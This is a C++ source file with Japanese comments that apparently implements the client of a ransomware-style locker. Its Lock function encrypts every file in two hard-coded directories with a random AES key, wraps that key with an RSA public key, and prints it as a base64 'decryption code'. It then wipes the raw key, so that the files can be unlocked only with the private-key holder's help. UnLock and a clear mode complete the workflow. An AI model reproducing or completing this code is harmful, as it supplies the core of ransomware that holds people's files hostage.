#include "user.h"

#include "../w_evp_pkey/evp_pkey.h"
#include "../w_aes/aes_manager.h"
#include "../w_rsa/rsa_manager.h"
#include "../w_base64/base64.h"

#include "../dir_cryptor/dir_cryptor.h"


std::string randomKey()
{
  std::string ret;
  std::random_device rd;
  std::mt19937 gen(rd());

  std::uniform_int_distribution<> distrib( 33 , 126 ); // ASCIIの文字・記号だけに制限する

  for( int i=0; i<16; i++ )
	ret.push_back( static_cast<char>(distrib(gen)) ); 

  return ret;
}


bool Lock( std::vector<const std::string > targetDirPaths )
{
	std::string keyStr = randomKey();
	openssl_wrapper::aes::W_AESKey_128 key( keyStr ); // AES 共通鍵の生成

	if( debug ){
		std::cout << keyStr << "\n";
	}

	openssl_wrapper::evp_pkey::W_EVP_PKEY pkey{};
	if( !(pkey.loadPub(publicPemPath)) ){
		std::cerr << "公開鍵を読み込めませんでした" << "\n";
		return false;
	} 
	/* 前準備完了 */

	DirCryptor cryptor{ targetDirPaths , &key }; // 暗号化オブジェクトの生成
	bool flag = cryptor.startEncrypt(); // 暗号化処理開始
	if( flag )
	{
		std::cout << "ファイルの暗号化が正常に完了しました" << "\n\n";
		// 共通鍵を暗号化する
		std::shared_ptr<unsigned char> encryptedCommonKey; size_t encryptedCommonKeyLength = 0;
		encryptedCommonKeyLength = openssl_wrapper::rsa::W_RSAManager::encrypt( &
			pkey, 
			reinterpret_cast<const unsigned char*>(keyStr.c_str()),
			keyStr.size(),
			&encryptedCommonKey 
		);
		if( encryptedCommonKeyLength <= 0 ){ // 基本的に失敗しないと思う
			std::cerr << "(致命的なエラー) 共通鍵の暗号化に失敗しました" << "\n";
			std::cout << "\x1b[33m" << keyStr << "\x1b[39m" << "\n"; // 共通鍵を失うと復号できなくなるので出力しておく
			return false;
		}

		// RSA暗号化した共通鍵をbase64にエンコードする		
		std::string encodedCommonKey;
		encodedCommonKey = openssl_wrapper::base64::W_Base64::encode( encryptedCommonKey.get() , encryptedCommonKeyLength );
		
		std::cout << "復号コード :: " << "\x1b[34m";
		std::cout << encodedCommonKey << "\n";
		std::cout << "\x1b[39m" << "\n";

		/* 生の共通鍵を消す */
		for( auto &itr : keyStr ) itr = 0x00; // メモリの上書き
		keyStr.clear(); // 削除
		
		return true;
	}
	return false;
}

bool UnLock( std::vector< const std::string > targetDirPaths ,std::string decryptedKeyStr )
{
 	if( decryptedKeyStr.size() <= 0 ) return false;
	openssl_wrapper::aes::W_AESKey_128 key( decryptedKeyStr );

	DirCryptor cryptor{ targetDirPaths , &key  };
	bool flag = cryptor.startDecrypt();
	if( flag )
		std::cout << "ファイルの復号が正常に完了しました" << "\n\n";
	else
		std::cout << "ファイルの復号が失敗しました" << "\n\n";

	return true;
}





int main( int argc , char* argv[] )
{
  std::cout << "(User) : HelloWorld." << "\n";

  std::vector< const std::string > targetDirPaths;
  targetDirPaths.push_back( targetDirPath_1 );
  targetDirPaths.push_back( targetDirPath_2 );

  std::string modeStr = argv[1];
  auto modeItr = mode.find( modeStr );
  if( modeItr == mode.end() ) return -1;
  int modeIndex = modeItr->second;
 
  switch(modeIndex)
  {
	case 1: // ロック
	  { 
		Lock( targetDirPaths );
  		break;
	  } 

	case 2: // アンロック
	  {
		std::string decryptedKeyStr = argv[2];
		UnLock( targetDirPaths ,decryptedKeyStr );
		break;
	  }

	case 3: // クリア ( debug )
	  {
		DirCryptor cryptor( targetDirPaths );
		cryptor.claerLockedFile();
		break;
	  }
	default:
	{
		break;
	}
  }
  return 0;
}


